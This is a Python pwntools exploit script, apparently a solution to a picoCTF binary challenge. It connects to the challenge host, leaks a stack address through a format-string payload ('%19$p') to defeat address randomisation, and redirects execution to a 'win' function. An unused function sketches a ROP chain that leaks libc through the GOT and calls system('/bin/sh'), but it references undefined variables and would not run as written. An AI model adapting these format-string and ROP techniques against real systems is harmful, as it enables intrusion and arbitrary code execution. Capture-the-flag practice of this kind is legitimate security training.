#!/usr/bin/env python3
from pwn import *

bin_file = './vuln'
context( os = 'linux', arch = 'amd64' )
context( terminal = ['tmux', 'splitw', '-h'] )
context.log_level = 'debug'

binf                = ELF( bin_file )
addr_main_offset    = binf.functions['main'].address
addr_win_offset     = binf.functions['win'].address
#addr_got_setbuf    = binf.got['setbuf']
addr_bss            = binf.bss()

diff = addr_main_offset - addr_win_offset

info( f"addr_main_offset=0x{addr_main_offset:08X}, addr_win_offset=0x{addr_win_offset:08X}" )

def attack_template( proc, **kwargs ):
    
    rop = ROP( binf )
    rop.raw( rop.ret )
    rop.printf( addr_got_setbuf )
    rop.raw( rop.ret )
    rop.main()
    
    proc.sendlineafter( '>> ', pack(0xdeadbeef) + bytes(rop) )
    proc.sendlineafter( '>> ', str(hex(addr_got_scf)) )
    proc.sendafter(     '>> ', str(hex(rop.r12_r13_r14_r15.address)) )
    
    addr_libc_setbuf = unpack( proc.recv(6), 'all' )
    libc.address     = addr_libc_setbuf - offset_libc_setbuf
    info( 'addr_libc_base = 0x{:08x}'.format(libc.address) )
    addr_libc_str_sh    = next( libc.search(b'/bin/sh') )
    
    rop = ROP( libc )
    rop.raw( rop.ret )
    rop.system( addr_libc_str_sh )
    
    proc.sendlineafter( '>> ', pack(0xcafebabe) + bytes(rop) )
    proc.sendlineafter( '>> ', str(hex(addr_bss)) )
    proc.sendlineafter( '>> ', '0' )

def attack( proc, **kwargs ):
    
    #proc.sendlineafter( 'name:', b'%23$p' ) # main
    #proc.sendlineafter( 'name:', b'%19$p,%20$p,%21$p,%22$p,%23$p,%24$p' )
    proc.sendlineafter( 'name:', b'%19$p' ) # main+65
    
    if True:
        addr = proc.recvline().decode('utf-8')
        info( f"type(addr)={type(addr)}, addr={addr}" )
        addr_main = int( addr, 16 ) - 65
        #addr_main = unpack( proc.recv(6), 'all' )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_win = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08X}, addr_win=0x{addr_win:08X}" )
    
    proc.sendlineafter( ': ', hex(addr_win).encode('utf-8') )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )

def main():
    
    adrs = "rescued-float.picoctf.net"
    #adrs = "localhost"
    port = 49884
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
